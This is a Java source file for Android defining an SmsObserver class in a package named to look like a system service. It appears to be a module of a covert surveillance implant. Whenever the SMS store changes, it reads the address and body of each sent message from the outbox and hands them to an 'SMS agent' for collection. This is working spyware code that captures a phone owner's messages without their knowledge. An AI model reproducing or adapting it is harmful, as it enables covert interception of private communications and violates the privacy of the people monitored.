package com.android.service.interfaces;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

import com.android.service.Sms;
import com.android.service.Status;
import com.android.service.agent.AgentManager;
import com.android.service.agent.AgentMessage;
import com.android.service.agent.AgentType;

public class SmsObserver extends ContentObserver {
	private static final String TAG = "SmsObserver";

	public SmsObserver(Handler handler) {
		super(handler);
	}

	@Override
	public void onChange(boolean bSelfChange) {
		super.onChange(bSelfChange);

		AgentMessage a = (AgentMessage)AgentManager.self().get(AgentType.AGENT_SMS);
		
		if (a == null)
			return;
		
		ContentResolver cr = Status.getAppContext().getContentResolver();
		
		// Se questa non dovesse piu andare cambiare in "content://sms"
		Cursor cur = cr.query(Uri.parse("content://sms/outbox"), null, null, null, null);
		
		while (cur.moveToNext()) {
			String protocol = cur.getString(cur.getColumnIndex("protocol"));
		
			if (protocol != null)
				return;
			
			Sms s = onSmsSend(cur);
			a.notification(s);
		}
		
		cur.close();
	}
	
	private Sms onSmsSend(Cursor cur) {
		//int threadId = cur.getInt(cur.getColumnIndex("thread_id"));
		//int status = cur.getInt(cur.getColumnIndex("status"));

		String body = cur.getString(cur.getColumnIndex("body"));
		String address = cur.getString(cur.getColumnIndex("address"));

		return new Sms(address, body, System.currentTimeMillis(), true);
	}
}